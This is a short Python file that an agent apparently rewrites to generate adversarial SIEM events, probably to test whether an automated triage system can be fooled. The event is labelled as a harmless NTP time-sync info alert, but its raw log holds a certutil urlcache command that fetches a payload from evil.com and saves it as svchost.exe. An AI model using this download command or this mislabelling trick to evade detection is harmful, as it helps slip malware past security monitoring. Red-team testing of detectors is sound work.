"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 36: certutil urlcache (LOLBin) + time_sync evasion + phantom IPs
    return {
        "task_type": "time_sync",
        "severity": "info",
        "siem_event": {
            "title": "NTP Time Sync",
            "source_ip": "10.130.0.5",
            "destination_ip": "10.130.0.6",
            "username": "svc_ntp",
            "hostname": "time-srv-01",
            "rule_name": "NTPSync",
            "raw_log": (
                "EventID=4688 Process=certutil.exe "
                "CommandLine=certutil -urlcache -split -f "
                "http://evil.com/payload.exe C:\\temp\\svchost.exe "
                "User=SYSTEM ParentProcess=cmd.exe"
            ),
        },
    }
